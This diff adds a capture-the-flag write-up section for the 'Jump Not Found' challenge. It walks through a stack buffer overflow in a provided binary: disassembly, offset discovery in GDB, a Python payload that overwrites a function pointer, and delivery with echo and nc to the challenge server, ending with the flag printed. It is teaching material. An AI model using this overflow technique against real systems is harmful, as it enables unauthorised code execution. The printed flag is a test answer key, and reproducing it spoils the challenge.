@@ -179,3 +179,151 @@ Now I have a different IP address to search: **37.46.96.0**.  This was an addres
 
 After the fact, I also found that inside of *Wireshark*, you can do a Protocol Hierarchy Statistic and find that only one packet had actual data.  By right clicking the entry, you can apply data as a filter and analyze the packet from there.
 
+## Jump Not Found
+We are trying to make a hyper jump to Naboo, but our system doesn't know where Naboo is. Can you help us figure out the issue?
+
+nc 192.241.138.174 9996
+
+This challenge included a *JNF* ELF binary.  I went through the normal process of strings and ltrace and didn't come up with anything definitive.  I then decided to take a look at the code by running *objdump*.
+
+```
+objdump -D JNF > JNF.dump
+```
+
+Having run the program, I can see where you enter a number associated with the location, and it indicates you went there. However, there are no entries to indicate a jump to "Naboo".  However, in the dump, I can clearly see there is a function for *jumpToNaboo*:
+
+```
+000000000040070a <jumpToNaboo>:
+  40070a:       55                      push   %rbp
+  40070b:       48 89 e5                mov    %rsp,%rbp
+  40070e:       bf 58 09 40 00          mov    $0x400958,%edi
+  400713:       e8 68 fe ff ff          callq  400580 <puts@plt>
+```
+
+So this is the function we want to get called.  I make note of the address *000000000040070a* and this turns out to bite me in the butt (more on this later).  I then analyze how the other functions are being called.  Analyzing the code in main, I can see that the function addresses are being moved onto the stack:
+
+```
+  40075e:       48 89 45 f0             mov    %rax,-0x10(%rbp)
+  400762:       48 8b 45 f0             mov    -0x10(%rbp),%rax
+  400766:       48 c7 00 d7 06 40 00    movq   $0x4006d7,(%rax)
+  40076d:       48 8b 45 f0             mov    -0x10(%rbp),%rax
+  400771:       48 c7 40 08 e8 06 40    movq   $0x4006e8,0x8(%rax)
+  400778:       00
+  400779:       48 8b 45 f0             mov    -0x10(%rbp),%rax
+  40077d:       48 c7 40 10 f9 06 40    movq   $0x4006f9,0x10(%rax)
+```
+
+However, jumpToNaboo doesn't get added.  So then I look at how the input is being handled handled by *gets* which means I can cause an overflow of the stack and potentially change some addresses.
+
+```
+40079b:       e8 20 fe ff ff          callq  4005c0 <gets@plt>
+```
+
+Another function worth mentioning is *strtol* because that's what the input gets run through.
+
+```
+4007b3:       e8 f8 fd ff ff          callq  4005b0 <strtol@plt>
+```
+
+Looking over the man page for this function and I see:
+
+```
+string is converted to a long int value in the obvious manner, stopping at the first character which is not a valid digit
+```
+
+So I know if I feed it `2 SOME_GARBAGE` strtol will return a 2 but my garbage still got read in by the *gets*.  Perfect. After a series of jumps based on user input of what location they want to visit the function is called via:
+
+```
+  40082b:       48 8b 50 10             mov    0x10(%rax),%rdx
+  40082f:       b8 00 00 00 00          mov    $0x0,%eax
+  400834:       ff d2                   callq  *%rdx
+```
+
+So if I overflow the stack and update the memory addresses, those will get loaded into *rdx* and I will jump to that location.  I hop over to (Wiremask)[https://wiremask.eu/tools/buffer-overflow-pattern-generator/?] to generate a unique pattern.  I know there are various scripts out there to do this but I kinda like the simplicity of this site.  Anyway, I grab a 100 byte pattern and try it out inside of *GDB*.  As I'm stepping through main, when prompted, I enter `2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A`.  It was an arbitrary decision to start with 2.  I then stepped down to right as it was about to `callq *%rdx` and checked to see what it holds.
+
+```
+(gdb) x/x $rdx
+0x4130644139634138:     Cannot access memory at address 0x4130644139634138
+```
+
+I take 0x4130644139634138 and head back to (Wiremask)[https://wiremask.eu/tools/buffer-overflow-pattern-generator/?] and enter it for the register value. It tells me this is 86 bytes into the pattern.  So I now I need 86 byes of fluff plus the memory address of *jumpToNaboo* and I should be golden.  I build my pattern.  I floundered here quite a bit thinking I had an endianness issue with my address.  I fought for quite a bit of time trying to get the address set just right.  Out of frustration, I reached out to the designer of the problem and laid out everything I had done and he indicated I was very close but there was a small issue with my payload.  I went back to the drawing board and revisited everything ensuring I was converting everything correctly.  Consequently I found a nice way to convert my addresses to little endian and know that I did it right:
+
+```
+>>> from struct import pack
+>>> rdx = 0x000000000040070a
+>>> with open('naboo', 'wb') as f:
+...     f.write('2 ' + 'a' * 86 + pack("<Q",rdx))
+... 
+```
+
+```
+↳ $ xxd naboo
+00000000: 3220 6161 6161 6161 6161 6161 6161 6161  2 aaaaaaaaaaaaaa
+00000010: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
+00000020: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
+00000030: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
+00000040: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
+00000050: 6161 6161 6161 6161 0a07 4000 0000 0000  aaaaaaaa..@.....
+```
+
+However, this payload didn't seem to work....
+
+```
+↳ $ cat naboo | ./JNF
+SYSTEM CONSOLE> Checking navigation...
+Segmentation fault (core dumped)
+```
+
+So I floundered for a bit more until I finally realized the issue was the memory address I was trying to load.  The memory address contained the hex value **\x0a**.  This also happens to correspond to the *line feed* on the ASCII chart causing *fgets* to stop processing input after that point.  This means that I didn't overflow my entire address into *rdx*.  I went back to the *jumpToNaboo function and moved down to the point where the memory address of the flag gets moved into the *rdi* register.
+
+```
+  40070e:       bf 58 09 40 00          mov    $0x400958,%edi
+  400713:       e8 68 fe ff ff          callq  400580 <puts@plt>
+```
+
+So I used *40070e* instead and rewrote the naboo file as before:
+
+```
+>>> rdx = 0x000000000040070e
+>>> with open('naboo', 'wb') as f:
+...     f.write('2 ' + 'a' * 86 + pack("<Q",rdx))
+...
+```
+
+```
+↳ $ xxd naboo
+00000000: 3220 6161 6161 6161 6161 6161 6161 6161  2 aaaaaaaaaaaaaa
+00000010: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
+00000020: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
+00000030: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
+00000040: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
+00000050: 6161 6161 6161 6161 0e07 4000 0000 0000  aaaaaaaa..@.....
+```
+
+I attempted again with the binary:
+
+```
+↳ $ cat naboo | ./JNF
+SYSTEM CONSOLE> Checking navigation...
+Jumping to Naboo...
+ UMDCTF-{ flag on server             }
+Segmentation fault (core dumped)
+```
+
+Sweet success! Now lets try it against the server.
+
+```
+↳ $ cat naboo | nc 192.241.138.174 9996
+SYSTEM CONSOLE>
+```
+
+What the heck man!  I know my payload works....  Hmmm...  Let me try a different way to deliver. Maybe *cat* is doing something weird.  Let me copy everything out and send it with *echo*.
+
+```
+↳ $ echo -e '2 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x0e\x07\x40\x00\x00\x00\x00' | nc 192.241.138.174 9996
+SYSTEM CONSOLE> Checking navigation...
+Jumping to Naboo...
+ UMDCTF-{S3tt1ng_C00rd1nat3s_T0_NaBOO}
+```
+
+Boom!
